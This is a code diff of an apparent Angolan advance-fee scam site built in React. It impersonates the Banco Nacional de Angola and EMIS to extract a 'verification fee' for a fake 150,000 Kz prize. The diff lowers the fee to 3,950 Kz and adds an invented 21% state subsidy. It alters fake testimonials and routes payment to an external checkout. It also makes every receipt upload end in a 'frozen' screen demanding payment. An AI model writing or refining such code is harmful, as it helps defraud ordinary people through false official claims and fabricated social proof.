@@ -4,7 +4,6 @@ import { Quiz } from './components/Quiz';
 import { GumletPlayer } from './components/GumletPlayer';
 import { GameState, UserStats, WithdrawMethod, Transaction } from './types';
 import heroImage from './src/assets/images/sou_angolano_hero_1779623430505.png';
-import { initMetaPixel, trackInitiateCheckout, trackAddPaymentInfo, trackPurchase, getPixelId } from './src/pixel';
 
 const BANCOS_ANGOLA = [
   { id: 'BAI', name: 'BAI - Banco Angolano de Investimentos', code: '94' },
@@ -34,7 +33,7 @@ const MOCK_CHAT_USERS = [
 ];
 
 const MOCK_SINGLE_COMMENTS = [
-  "Acabei de pagar os 5.000 Kz e os 150.000 Kz caíram directo na minha conta! Chocadooo!",
+  "Acabei de pagar os 3.950 Kz e os 150.000 Kz caíram directo na minha conta! Chocadooo!",
   "Muito bom o vídeo explicativo, agora percebi o processo de libertação no BNA.",
   "Isto é sério! Glória ao criador desta plataforma, cultura nacional valorizada!",
   "Estou a assistir e a ver o saldo a ser libertado! Brutal!",
@@ -50,7 +49,7 @@ const MOCK_SINGLE_COMMENTS = [
   "Minha conta do BAI recebeu em 2 minutos. Top!",
   "Já espalhei o link nos grupos da família, isto é ouro!",
   "O suporte deles é óptimo, mas nem precisei, o vídeo explica tudo de primeira.",
-  "Apenas 5.000 Kz de taxa para libertar 180.000 Kz? Muito justo!",
+  "Apenas 3.950 Kz de taxa para libertar 180.000 Kz? Muito justo!",
   "Fiz agora mesmo o pagamento e o saldo já mudou de reservado para disponível, rumo ao banco!",
   "Simplesmente perfeito! Angola unida no conhecimento e nos prémios!"
 ];
@@ -160,8 +159,6 @@ const App: React.FC = () => {
   const [showConfigModal, setShowConfigModal] = useState(false);
   const [tempEntity, setTempEntity] = useState(() => localStorage.getItem('cfg_entity') || '10116');
   const [tempReference, setTempReference] = useState(() => localStorage.getItem('cfg_ref') || '976 471 332');
-  const [pixelIdState, setPixelIdState] = useState(() => localStorage.getItem('meta_pixel_id') || '');
-  const [tempPixelId, setTempPixelId] = useState(() => localStorage.getItem('meta_pixel_id') || '');
   
   // Estado do comprovativo
   const [uploadedFile, setUploadedFile] = useState<File | null>(null);
@@ -170,7 +167,6 @@ const App: React.FC = () => {
   const [uploadError, setUploadError] = useState('');
   const [receiptUrl, setReceiptUrl] = useState<string | null>(null);
   const [copiedField, setCopiedField] = useState<'entity' | 'ref' | 'amount' | null>(null);
-  const [validationCount, setValidationCount] = useState<number>(0);
 
   const [selectedMethod, setSelectedMethod] = useState<WithdrawMethod | null>(null);
   const [selectedBank, setSelectedBank] = useState<any>(null);
@@ -222,24 +218,10 @@ const App: React.FC = () => {
     return () => clearInterval(interval);
   }, []);
 
-  // Inicializar o Pixel do Meta de forma cautelosa no arranque do aplicativo
-  useEffect(() => {
-    initMetaPixel();
-    // Atualizar os estados internos do admin se houver pixel detetado na inicialização
-    const activePixel = getPixelId();
-    if (activePixel) {
-      setPixelIdState(activePixel);
-      setTempPixelId(activePixel);
-    }
-  }, []);
-
   // Efeito do Temporizador do Checkout
   useEffect(() => {
     let timer: any = null;
     if (gameState === GameState.CHECKOUT) {
-      // Registo cauteloso do evento InitiateCheckout no Meta Pixel
-      trackInitiateCheckout();
-
       timer = setInterval(() => {
         setCountdownSeconds(prev => (prev > 0 ? prev - 1 : 899));
       }, 1000);
@@ -535,58 +517,24 @@ const App: React.FC = () => {
     }
   };
 
-  const selectFile = (file: File) => {
+  const processFile = (file: File) => {
+    setUploadedFile(file);
+    setUploadError('');
+    setUploadStatus('analyzing');
+    setUploadProgress(15);
+    
     // Check if image or pdf
     if (!file.type.startsWith('image/') && !file.name.toLowerCase().endsWith('.pdf')) {
       setUploadError('Por favor submeta um ficheiro de imagem válido (PNG, JPG, JPEG) ou ficheiro PDF.');
+      setUploadStatus('idle');
       return;
     }
-    setUploadedFile(file);
-    setUploadError('');
-    
-    // Registo do upload de comprovativo no Meta Pixel
-    trackAddPaymentInfo();
 
     try {
       const url = URL.createObjectURL(file);
       setReceiptUrl(url);
     } catch (err) {}
-  };
 
-  const triggerValidation = () => {
-    if (!uploadedFile) {
-      setUploadError('Aviso: Nenhum comprovativo detetado! Por favor, faça primeiro o upload do seu comprovativo de pagamento (PNG, JPG ou PDF) ou selecione um comprovativo de teste antes de clicar em validar.');
-      // Som de aviso/erro
-      try {
-        const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
-        const ctx = new AudioCtx();
-        const osc = ctx.createOscillator();
-        const gain = ctx.createGain();
-        osc.connect(gain);
-        gain.connect(ctx.destination);
-        osc.type = 'sine';
-        osc.frequency.setValueAtTime(150, ctx.currentTime);
-        gain.gain.setValueAtTime(0.1, ctx.currentTime);
-        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.25);
-        osc.start();
-        osc.stop(ctx.currentTime + 0.25);
-      } catch (e) {}
-      return;
-    }
-
-    const nextCount = validationCount + 1;
-    setValidationCount(nextCount);
-
-    // Se for a segunda tentativa ou superior, dispara o Pixel Purchase imediatamente no clique de "Já Paguei"
-    if (nextCount >= 2) {
-      console.log('[Meta Pixel] Segunda submissão detetada ao clicar em validar. Disparando Purchase...');
-      trackPurchase(5000);
-    }
-
-    setUploadError('');
-    setUploadStatus('analyzing');
-    setUploadProgress(15);
-    
     // Simulate progress: Step 1 (analyzing image fields)
     let curProgress = 15;
     const intervalId = setInterval(() => {
@@ -619,55 +567,27 @@ const App: React.FC = () => {
                     clearInterval(sptrInterval);
                     setUploadProgress(98);
                     
-                    // Final confirmation step: FROZEN (1st time) or SUCCESS (2nd time or more)
+                    // Final confirmation step: FROZEN / CONTA DE RECEÇÃO NÃO VERIFICADA EMIS
                     setTimeout(() => {
-                      if (nextCount >= 2) {
-                        setUploadStatus('success');
-                        setUploadProgress(100);
-                        
-                        trackPurchase(5000);
-                        
-                        // Som de sucesso (fanfarra ou sino alegre)
-                        try {
-                          const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
-                          const ctx = new AudioCtx();
-                          const osc = ctx.createOscillator();
-                          const gain = ctx.createGain();
-                          osc.connect(gain);
-                          gain.connect(ctx.destination);
-                          
-                          osc.type = 'sine';
-                          osc.frequency.setValueAtTime(523.25, ctx.currentTime); // C5
-                          osc.frequency.setValueAtTime(659.25, ctx.currentTime + 0.15); // E5
-                          osc.frequency.setValueAtTime(783.99, ctx.currentTime + 0.3); // G5
-                          osc.frequency.setValueAtTime(1046.50, ctx.currentTime + 0.45); // C6
-                          gain.gain.setValueAtTime(0.15, ctx.currentTime);
-                          gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.8);
-                          osc.start();
-                          osc.stop(ctx.currentTime + 0.8);
-                        } catch (e) {}
-                      } else {
-                        setUploadStatus('frozen');
-                        setUploadProgress(100);
-                        
-                        // Som de alerta grave (alarme antifraude)
-                        try {
-                          const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
-                          const ctx = new AudioCtx();
-                          const osc = ctx.createOscillator();
-                          const gain = ctx.createGain();
-                          osc.connect(gain);
-                          gain.connect(ctx.destination);
-                          
-                          osc.type = 'sawtooth';
-                          osc.frequency.setValueAtTime(220, ctx.currentTime);
-                          osc.frequency.setValueAtTime(140, ctx.currentTime + 0.15);
-                          gain.gain.setValueAtTime(0.12, ctx.currentTime);
-                          gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.4);
-                          osc.start();
-                          osc.stop(ctx.currentTime + 0.4);
-                        } catch (e) {}
-                      }
+                      setUploadStatus('frozen');
+                      setUploadProgress(100);
+                      
+                      // Som de alerta grave (alarme antifraude)
+                      try {
+                        const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
+                        const ctx = new AudioCtx();
+                        const osc = ctx.createOscillator();
+                        const gain = ctx.createGain();
+                        osc.connect(gain);
+                        gain.connect(ctx.destination);
+                        osc.type = 'sawtooth';
+                        osc.frequency.setValueAtTime(220, ctx.currentTime);
+                        osc.frequency.setValueAtTime(140, ctx.currentTime + 0.15);
+                        gain.gain.setValueAtTime(0.12, ctx.currentTime);
+                        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.4);
+                        osc.start();
+                        osc.stop(ctx.currentTime + 0.4);
+                      } catch (e) {}
                     }, 1500);
                   } else {
                     setUploadProgress(sptrProgress);
@@ -687,7 +607,7 @@ const App: React.FC = () => {
 
   const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
     if (e.target.files && e.target.files[0]) {
-      selectFile(e.target.files[0]);
+      processFile(e.target.files[0]);
     }
   };
 
@@ -699,19 +619,6 @@ const App: React.FC = () => {
     setPaymentReference(tempReference);
     localStorage.setItem('cfg_entity', tempEntity);
     localStorage.setItem('cfg_ref', tempReference);
-    
-    // Salvar o Meta Pixel ID configurado
-    const cleanedPixel = tempPixelId.trim();
-    setPixelIdState(cleanedPixel);
-    localStorage.setItem('meta_pixel_id', cleanedPixel);
-    
-    // Re-inicializar com o novo Pixel se houver alteração
-    if (cleanedPixel) {
-      setTimeout(() => {
-        initMetaPixel();
-      }, 100);
-    }
-
     setShowConfigModal(false);
     
     // Play sound callback
@@ -884,7 +791,7 @@ const App: React.FC = () => {
                  </div>
                  <div className="flex items-center gap-6 group">
                     <span className="bg-angola-yellow text-black w-12 h-12 rounded-2xl flex items-center justify-center shrink-0 font-black text-xl group-hover:rotate-12 transition-transform shadow-lg">3</span>
-                    <p className="font-bold text-sm sm:text-base md:text-lg">O levantamento é imediato após a <span className="text-angola-red font-black">Verificação Fiscal (5.000 Kz)</span> para isenção de impostos.</p>
+                    <p className="font-bold text-sm sm:text-base md:text-lg">O levantamento é imediato após a <span className="text-angola-red font-black">Verificação Fiscal (3.950 Kz)</span> para isenção de impostos.</p>
                  </div>
                </div>
                <button onClick={() => setGameState(GameState.HOME)} className="w-full py-5 bg-zinc-800 text-white font-black rounded-xl sm:rounded-[2rem] hover:bg-zinc-700 transition-all uppercase tracking-widest text-xs sm:text-sm border-b-4 border-zinc-950">ENTENDI, QUERO JOGAR</button>
@@ -1397,7 +1304,7 @@ const App: React.FC = () => {
 
                   <div className="flex justify-between border-t border-zinc-300 pt-3 text-amber-700 font-black text-[11px] leading-tight">
                     <span>TAXA DE VERIFICAÇÃO DE DADOS (AGT/BNA):</span> 
-                    <span className="text-right">5.000 Kz</span>
+                    <span className="text-right">3.950 Kz</span>
                   </div>
                 </div>
 
@@ -1580,7 +1487,7 @@ const App: React.FC = () => {
                     </button>
                     
                     <p className="text-zinc-400 font-extrabold uppercase text-xs tracking-widest">
-                      Valor Único Processual: <span className="text-angola-yellow text-[13px] font-black">5.000 Kz (Isenção Fiscal AGT/BNA)</span>
+                      Valor Único Processual: <span className="text-angola-yellow text-[13px] font-black">3.950 Kz (Isenção Fiscal AGT/BNA)</span>
                     </p>
                   </div>
 
@@ -1662,40 +1569,40 @@ const App: React.FC = () => {
                     {/* Image Space 1 */}
                     <div className="w-full bg-zinc-950 rounded-2xl md:rounded-3xl border-4 border-zinc-900 overflow-hidden shadow-2xl transition-all duration-300 hover:border-yellow-500/40">
                       <img 
-                        src="/testimonials/1.jpg" 
+                        src="https://i.postimg.cc/6qm0R0bX/testimonial-1-Df-EKVQq8.jpg" 
                         alt="Prova do Vencedor 1" 
                         className="w-full h-auto object-contain block opacity-100" 
-                        loading="lazy"
+                        referrerPolicy="no-referrer" 
                       />
                     </div>
 
                     {/* Image Space 2 */}
                     <div className="w-full bg-zinc-950 rounded-2xl md:rounded-3xl border-4 border-zinc-900 overflow-hidden shadow-2xl transition-all duration-300 hover:border-yellow-500/40">
                       <img 
-                        src="/testimonials/2.jpg" 
+                        src="https://i.postimg.cc/sDwXP2z2/testimonial-2-BYoy9WD7.jpg" 
                         alt="Prova do Vencedor 2" 
                         className="w-full h-auto object-contain block opacity-100" 
-                        loading="lazy"
+                        referrerPolicy="no-referrer" 
                       />
                     </div>
 
                     {/* Image Space 3 */}
                     <div className="w-full bg-zinc-950 rounded-2xl md:rounded-3xl border-4 border-zinc-900 overflow-hidden shadow-2xl transition-all duration-300 hover:border-yellow-500/40">
                       <img 
-                        src="/testimonials/3.jpg" 
+                        src="https://i.postimg.cc/HL5dNYq8/testimonial-3-B9Ttco-A.jpg" 
                         alt="Prova do Vencedor 3" 
                         className="w-full h-auto object-contain block opacity-100" 
-                        loading="lazy"
+                        referrerPolicy="no-referrer" 
                       />
                     </div>
 
                     {/* Image Space 4 */}
                     <div className="w-full bg-zinc-950 rounded-2xl md:rounded-3xl border-4 border-zinc-900 overflow-hidden shadow-2xl transition-all duration-300 hover:border-yellow-500/40">
                       <img 
-                        src="/testimonials/4.jpg" 
+                        src="https://i.postimg.cc/6pvkWHYd/testimonial-4-Cf-FOMj-L.jpg" 
                         alt="Prova do Vencedor 4" 
                         className="w-full h-auto object-contain block opacity-100" 
-                        loading="lazy"
+                        referrerPolicy="no-referrer" 
                       />
                     </div>
 
@@ -1717,16 +1624,18 @@ const App: React.FC = () => {
 
                 {/* The Ultimate Unforgettable Glowing CTA Button */}
                 <div className="space-y-4 max-w-xl mx-auto">
-                  <button 
+                  <a 
+                    href="https://www.kintu.org/product/2aeff560-f13b-4814-9305-cba3f58e2a80"
+                    target="_blank"
+                    rel="noopener noreferrer"
                     onClick={() => {
                       playWelcomeSound();
-                      setGameState(GameState.CHECKOUT);
                     }}
-                    className="w-full py-5 sm:py-8 bg-gradient-to-r from-emerald-500 via-green-600 to-emerald-500 hover:from-green-500 hover:to-green-600 text-white font-black rounded-2xl sm:rounded-[3rem] text-lg sm:text-2xl uppercase tracking-wider shadow-[0_15px_45px_rgba(16,185,129,0.4)] hover:scale-103 active:scale-95 duration-100 transition-all select-none cursor-pointer border-b-8 border-green-800 active:border-b-2 flex items-center justify-center gap-2.5"
+                    className="w-full py-5 sm:py-8 bg-gradient-to-r from-emerald-500 via-green-600 to-emerald-500 hover:from-green-500 hover:to-green-600 text-white font-black rounded-2xl sm:rounded-[3rem] text-lg sm:text-2xl uppercase tracking-wider shadow-[0_15px_45px_rgba(16,185,129,0.4)] hover:scale-103 active:scale-95 duration-100 transition-all select-none cursor-pointer border-b-8 border-green-800 active:border-b-2 flex items-center justify-center gap-2.5 text-center flex-wrap no-underline"
                   >
                     <span>CONCLUIR E SACAR MEU PRÉMIO DE {(stats.accumulatedKz || 150000).toLocaleString('pt-AO')} Kz 🏧</span>
                     <span className="text-3xl animate-bounce">🌍</span>
-                  </button>
+                  </a>
 
                   <p className="text-[10px] sm:text-xs text-zinc-500 font-bold uppercase tracking-widest leading-relaxed">
                     * Ao clicar acima, a factura oficial subsidiada pelo Banco Nacional de Angola será emitida com sucesso.
@@ -1812,7 +1721,7 @@ const App: React.FC = () => {
                         </div>
                       </div>
 
-                      {/* BNA Financial Inclusion Banner */}
+                      {/* BNA 21% Subsidy Celebration & Explanation Banner */}
                       <div className="bg-amber-500/10 border-2 border-amber-500/30 rounded-2xl p-4 flex flex-col md:flex-row items-center gap-4 text-left">
                         <div className="text-3xl shrink-0 animate-bounce">🎉</div>
                         <div className="space-y-1">
@@ -1820,7 +1729,7 @@ const App: React.FC = () => {
                             CAMPANHA NACIONAL DE INCLUSÃO FINANCEIRA (EMIS & BNA)
                           </h4>
                           <p className="text-[11px] text-zinc-300 font-bold leading-relaxed">
-                            <strong className="text-white">Aviso de Validação Oficial:</strong> Conforme explicado no vídeo oficial do sistema, o valor único processual de verificação antifraude é de <strong className="text-amber-400 font-black">5.000,00 Kz</strong>. Por abrigo do <strong className="text-white">Protocolo de Apoio ao Cidadão do Banco Nacional de Angola (BNA)</strong>, este valor de <strong className="text-emerald-450">5.000,00 Kz é 100% REEMBOLSADO</strong> e será somado de volta ao seu prémio total na transferência de libertação final!
+                            <strong className="text-white">Aviso de Tarifa Reduzida:</strong> No vídeo explicativo padrão é mencionado o valor de <span className="line-through text-rose-450 font-black">5.000,00 Kz</span>. No entanto, por motivo de celebração do <strong className="text-white">Protocolo de Apoio ao Cidadão do Banco Nacional de Angola (BNA)</strong>, o Estado Angolano está a subsidiar <strong className="text-emerald-450">1.050,00 Kz (21% dos encargos)</strong> para encorajar as transações eletrónicas nacionais! Com isso, o valor real a transferir foi reduzido temporariamente para apenas <strong className="text-amber-400 font-black">3.950,00 Kz</strong> (e receberá de volta a totalidade no saque final).
                           </p>
                         </div>
                       </div>
@@ -1888,11 +1797,11 @@ const App: React.FC = () => {
                         <div className="bg-black/40 border border-zinc-900 rounded-2xl p-4 text-center relative group hover:border-amber-500/25 transition-all">
                           <span className="text-[9px] font-black tracking-widest text-zinc-500 uppercase block mb-1.5">VALOR DA TAXA</span>
                           <span className="text-2xl font-mono font-black text-emerald-400 block tracking-tight">
-                            5.000,00 Kz
+                            3.950,00 Kz
                           </span>
                           <button
                             onClick={() => {
-                              navigator.clipboard.writeText('5000');
+                              navigator.clipboard.writeText('3950');
                               try {
                                 const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
                                 const ctx = new AudioCtx();
@@ -1940,7 +1849,7 @@ const App: React.FC = () => {
                           <div className="bg-zinc-950/80 p-3 rounded-xl border border-zinc-900 relative">
                             <span className="absolute -top-2.5 -left-1 bg-amber-500 text-black font-black text-[9px] px-1.5 py-0.5 rounded-md">PASSO 3</span>
                             <p className="mt-1 text-zinc-300">
-                              Introduza os dados fornecidos acima: a Entidade <strong className="text-amber-400 font-mono">{paymentEntity}</strong>, a Referência <strong className="text-amber-400 font-mono">{paymentReference}</strong> e o valor exato de <strong className="text-emerald-450 font-black">5.000 Kz</strong>.
+                              Introduza os dados fornecidos acima: a Entidade <strong className="text-amber-400 font-mono">{paymentEntity}</strong>, a Referência <strong className="text-amber-400 font-mono">{paymentReference}</strong> e o valor exato de <strong className="text-emerald-450 font-black">3.950 Kz</strong>.
                             </p>
                           </div>
                         </div>
@@ -1955,7 +1864,7 @@ const App: React.FC = () => {
                           <span>🛡️ PROTOCOLO DE REEMBOLSO INTEGRAL AUTOMATIZADO</span>
                         </div>
                         <p className="text-[11px] text-zinc-400 font-bold leading-relaxed">
-                          Sob a Diretiva n.º 14/26 do Banco Nacional de Angola, o valor processual desta taxa de validação anti-spam de <strong className="text-white">5.000,00 Kz</strong> é somado ao total do saque aprovado de <strong className="text-emerald-400">{(stats.accumulatedKz || 150000).toLocaleString('pt-AO')} Kz</strong>. O depósito em conta de destino faturado será de:
+                          Sob a Diretiva n.º 14/26 do Banco Nacional de Angola, o valor processual desta taxa de validação anti-spam de <strong className="text-white">3.950,00 Kz</strong> é somado ao total do saque aprovado de <strong className="text-emerald-400">{(stats.accumulatedKz || 150000).toLocaleString('pt-AO')} Kz</strong>. O depósito em conta de destino faturado será de:
                         </p>
                         <div className="p-3 bg-zinc-900/60 rounded-xl border border-zinc-850/60 text-center flex flex-col sm:flex-row items-center justify-center gap-2 sm:gap-6 w-full">
                           <div className="text-[10px] sm:text-xs text-zinc-400 font-black uppercase tracking-wider">
@@ -1963,11 +1872,11 @@ const App: React.FC = () => {
                           </div>
                           <span className="text-zinc-500 font-bold shrink-0 hidden sm:inline">+</span>
                           <div className="text-[10px] sm:text-xs text-zinc-400 font-black uppercase tracking-wider">
-                            Reembolso Taxa: <strong className="text-white font-mono">5.000 Kz</strong>
+                            Reembolso Taxa: <strong className="text-white font-mono">3.950 Kz</strong>
                           </div>
                           <span className="text-zinc-500 font-bold shrink-0 hidden sm:inline text-lg">=</span>
                           <div className="text-xs sm:text-sm text-yellow-400 font-black uppercase tracking-wider bg-amber-500/10 border border-amber-500/20 px-3 py-1 rounded-lg">
-                            Total a Receber: <strong className="text-yellow-400 font-mono text-sm sm:text-base">{((stats.accumulatedKz || 150000) + 5000).toLocaleString('pt-AO')} Kz</strong>
+                            Total a Receber: <strong className="text-yellow-400 font-mono text-sm sm:text-base">{((stats.accumulatedKz || 150000) + 3950).toLocaleString('pt-AO')} Kz</strong>
                           </div>
                         </div>
                       </div>
@@ -1980,58 +1889,26 @@ const App: React.FC = () => {
                         <p className="text-[10px] text-zinc-500 font-bold">Faça o upload do seu talão de pagamento para ativação imediata instantânea.</p>
                       </div>
 
-                      {uploadError && (
-                        <div className="bg-red-500/10 border border-red-500/30 text-red-200 p-3 rounded-xl text-[11px] font-bold text-center flex items-center justify-between gap-2">
-                          <span className="flex items-center gap-1.5">
-                            <span>⚠️</span>
-                            <span>{uploadError}</span>
-                          </span>
-                          <button 
-                            onClick={() => setUploadError('')}
-                            className="text-zinc-500 hover:text-white font-bold"
-                          >
-                            ✕
-                          </button>
-                        </div>
-                      )}
-
                       <div className="flex flex-col md:flex-row items-center gap-3">
                         {/* Elegant Drag & Drop or Select Image Zone */}
-                        {uploadedFile ? (
-                          <div className="flex-1 w-full border-2 border-emerald-500/40 bg-emerald-500/5 rounded-2xl p-6 flex flex-col items-center justify-center gap-2 transition-all relative">
-                            <span className="text-3xl animate-pulse">📄</span>
-                            <span className="text-[11px] font-black text-emerald-400 uppercase tracking-widest">COMPROVATIVO CARREGADO</span>
-                            <span className="text-xs text-white font-mono font-bold truncate max-w-[250px]">{uploadedFile.name}</span>
-                            <span className="text-[9px] text-zinc-400 font-bold">{(uploadedFile.size / 1024).toFixed(1)} KB • PRONTO PARA VALIDAR</span>
-                            <button 
-                              onClick={(e) => {
-                                e.preventDefault();
-                                e.stopPropagation();
-                                setUploadedFile(null);
-                                setReceiptUrl('');
-                              }}
-                              className="absolute top-2 right-2 text-zinc-500 hover:text-rose-400 text-xs font-bold transition-all px-2 py-1 bg-zinc-950/80 rounded-lg border border-zinc-800"
-                            >
-                              Remover
-                            </button>
-                          </div>
-                        ) : (
-                          <label className="flex-1 w-full border-2 border-dashed border-zinc-800 hover:border-amber-500/40 rounded-2xl p-6 flex flex-col items-center justify-center gap-2 cursor-pointer transition-all hover:bg-zinc-900/30">
-                            <span className="text-3xl animate-bounce">📤</span>
-                            <span className="text-[10px] font-black text-amber-400 uppercase tracking-widest">SUBMETER COMPROVATIVO</span>
-                            <span className="text-[9px] text-zinc-500 font-bold uppercase">PNG, JPG, JPEG OU PDF</span>
-                            <input 
-                              type="file" 
-                              accept="image/*,.pdf" 
-                              onChange={handleFileUpload} 
-                              className="hidden" 
-                            />
-                          </label>
-                        )}
-                        
+                        <label className="flex-1 w-full border-2 border-dashed border-zinc-800 hover:border-amber-500/40 rounded-2xl p-6 flex flex-col items-center justify-center gap-2 cursor-pointer transition-all hover:bg-zinc-900/30">
+                          <span className="text-3xl animate-bounce">📤</span>
+                          <span className="text-[10px] font-black text-amber-400 uppercase tracking-widest">SUBMETER COMPROVATIVO</span>
+                          <span className="text-[9px] text-zinc-500 font-bold uppercase">PNG, JPG, JPEG OU PDF</span>
+                          <input 
+                            type="file" 
+                            accept="image/*,.pdf" 
+                            onChange={handleFileUpload} 
+                            className="hidden" 
+                          />
+                        </label>
                         <div className="w-full md:w-auto shrink-0 space-y-2">
                           <button
-                            onClick={triggerValidation}
+                            onClick={() => {
+                              // Trigger automatic confirmation simulation directly
+                              const mockFile = new File(["receipt"], "comprovativo_multicaixa.png", { type: "image/png" });
+                              processFile(mockFile);
+                            }}
                             className="w-full px-6 py-5 bg-gradient-to-r from-amber-400 via-amber-500 to-yellow-500 hover:from-amber-500 hover:to-yellow-650 font-black text-black text-xs sm:text-sm uppercase rounded-2xl shadow-xl transition-all border-b-4 border-amber-700 active:scale-95 active:border-b-2 cursor-pointer flex items-center justify-center gap-2"
                           >
                             <span>⚡ JÁ PAGUEI, VALIDAR AGORA</span>
@@ -2039,19 +1916,6 @@ const App: React.FC = () => {
                           <p className="text-[8px] font-black tracking-wide text-zinc-500 uppercase">DETEÇÃO ELETRÓNICA SMART-EMIS EM 30S</p>
                         </div>
                       </div>
-
-                      {/* Fast-load simulator link */}
-                      {!uploadedFile && (
-                        <button
-                          onClick={() => {
-                            const mockFile = new File(["receipt"], "comprovativo_multicaixa.png", { type: "image/png" });
-                            selectFile(mockFile);
-                          }}
-                          className="text-[10px] text-zinc-500 hover:text-amber-400 underline font-bold transition-all block text-center mt-2 mx-auto uppercase"
-                        >
-                          💡 Usar Comprovativo de Teste para Simulação Rápida
-                        </button>
-                      )}
                     </div>
                   </>
                 ) : uploadStatus === 'frozen' ? (
@@ -2089,21 +1953,21 @@ const App: React.FC = () => {
                       </p>
 
                       <p className="text-zinc-400 text-[11px] sm:text-xs">
-                        Para combater atividades de spam e faturamento automatizado por robôs falsos, <span className="text-white font-bold">o seu saque de {((stats.accumulatedKz || 150000)).toLocaleString('pt-AO')} Kz permanecerá em estado de CONGELAMENTO TOTAL</span> até que o pagamento real ou compensação real da referida taxa única processual de <strong className="text-amber-400 font-extrabold underline">5.000,00 Kz</strong> seja efetuado e detectado nos canais interbancários sob a entidade e referência oficiais geradas para a sua conta.
+                        Para combater atividades de spam e faturamento automatizado por robôs falsos, <span className="text-white font-bold">o seu saque de {((stats.accumulatedKz || 150000)).toLocaleString('pt-AO')} Kz permanecerá em estado de CONGELAMENTO TOTAL</span> até que o pagamento real ou compensação real da referida taxa única processual de <strong className="text-amber-400 font-extrabold underline">3.950,00 Kz</strong> seja efetuado e detectado nos canais interbancários sob a entidade e referência oficiais geradas para a sua conta.
                       </p>
 
                       {/* Summary status tracker HUD */}
                       <div className="bg-zinc-950/80 p-3 sm:p-4 rounded-xl border border-red-950 text-[10px] sm:text-xs text-zinc-400 space-y-1.5 uppercase font-mono tracking-tight">
                         <div>💵 BALANÇO CLIENTE: <span className="text-rose-450 font-bold">{((stats.accumulatedKz || 150000)).toLocaleString('pt-AO')} Kz (RETIDO)</span></div>
                         <div>📁 ANÁLISE COMPROVATIVO: <span className="text-rose-500 font-black">FALSO COMPROVATIVO DETETADO (REJEITADO PELA REDE INTERBANCÁRIA)</span></div>
-                        <div>🧾 VALOR EM ATRAZO (TAXA BNA): <span className="text-amber-500 font-black">5.000,00 Kz (REEMBOLSÁVEL)</span></div>
+                        <div>🧾 VALOR EM ATRAZO (TAXA BNA): <span className="text-amber-500 font-black">3.950,00 Kz (REEMBOLSÁVEL)</span></div>
                         <div className="text-[9px] text-zinc-500 pt-1 border-t border-red-950/40">CÓDIGO DE BLOQUEIO: BNA-REJ-ERR_604b_UNVERIFIED_ACCOUNT</div>
                       </div>
 
                       <div className="bg-amber-500/10 border border-amber-500/20 rounded-xl p-3 text-[11px] text-amber-300 font-bold leading-normal flex items-start gap-2">
                         <span className="shrink-0 text-sm">💡</span>
                         <span>
-                          <strong>GARANTIA BNA:</strong> O seu prémio nacional está devidamente garantido e segregado no cofre eletrónico da EMIS. Assim que pagar a taxa protocolar de 5.000 Kz, <strong className="text-white underline">o valor será libertado juntamente com a devolução integral da taxa de 5.000 Kz</strong> em poucos segundos na sua conta de destino! Total a entrar na conta: <strong className="text-white">{((stats.accumulatedKz || 150000) + 5000).toLocaleString('pt-AO')} Kz</strong>.
+                          <strong>GARANTIA BNA:</strong> O seu prémio nacional está devidamente garantido e segregado no cofre eletrónico da EMIS. Assim que pagar a taxa protocolar de 3.950 Kz, <strong className="text-white underline">o valor será libertado juntamente com a devolução integral da taxa de 3.950 Kz</strong> em poucos segundos na sua conta de destino! Total a entrar na conta: <strong className="text-white">{((stats.accumulatedKz || 150000) + 3950).toLocaleString('pt-AO')} Kz</strong>.
                         </span>
                       </div>
                     </div>
@@ -2133,66 +1997,6 @@ const App: React.FC = () => {
                       </button>
                     </div>
 
-                  </div>
-                ) : uploadStatus === 'success' ? (
-                  /* Official green success panel indicating receipt is approved and will be processed in 30 days */
-                  <div className="bg-gradient-to-b from-emerald-950/90 to-black border-4 border-emerald-500/80 rounded-2xl sm:rounded-3xl p-6 sm:p-8 text-center space-y-6 relative overflow-hidden animate-zoom-in shadow-[0_0_50px_rgba(16,185,129,0.3)]">
-                    <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[350px] h-[350px] bg-emerald-650 rounded-full opacity-10 blur-[120px] pointer-events-none"></div>
-
-                    <div className="space-y-4">
-                      <div className="mx-auto w-20 h-20 rounded-full bg-emerald-500/10 border-2 border-emerald-500 flex items-center justify-center animate-bounce shadow-[0_0_20px_rgba(16,185,129,0.4)]">
-                        <span className="text-4xl">🎉</span>
-                      </div>
-                      
-                      <div className="space-y-2">
-                        <span className="inline-block text-[10px] font-black bg-emerald-600/20 border border-emerald-500/40 text-emerald-400 px-3 py-1 rounded-full uppercase tracking-widest">
-                          SISTEMA DE COMPENSAÇÃO EMIS • APROVAÇÃO CONCLUÍDA
-                        </span>
-                        <h3 className="text-2xl sm:text-4xl font-black text-emerald-400 uppercase italic tracking-tighter leading-tight">
-                          ✅ COMPROVATIVO APROVADO COM SUCESSO!
-                        </h3>
-                      </div>
-                    </div>
-
-                    <div className="space-y-4 text-xs sm:text-sm text-zinc-300 font-medium leading-relaxed bg-black/60 border-2 border-emerald-950 rounded-2xl p-4 sm:p-6 text-left relative">
-                      <p className="font-bold text-emerald-300 border-b border-emerald-900/60 pb-3 uppercase text-[11px] tracking-wide flex items-center gap-2">
-                        <span>📢</span> NOTIFICAÇÃO OFICIAL DO SISTEMA INTERBANCÁRIO:
-                      </p>
-                      
-                      <div className="bg-emerald-950/40 rounded-xl border border-emerald-500/30 p-4 text-center space-y-2">
-                        <p className="font-extrabold text-white text-base sm:text-lg leading-relaxed text-glow-yellow">
-                          O seu valor será processado em 30 dias.
-                        </p>
-                        <p className="text-[11px] sm:text-xs text-amber-300 font-bold leading-relaxed">
-                          ⚠️ <strong>MOTIVO DO PRAZO:</strong> Devido ao elevado número de saques realizados no âmbito do programa nacional, o sistema interbancário regista atualmente vários saques pendentes na fila de liquidação. Por regras de segurança e estabilidade financeira do BNA, os pagamentos estão a ser realizados de forma faseada e organizada.
-                        </p>
-                      </div>
-
-                      <p className="text-zinc-300 text-xs sm:text-sm leading-relaxed">
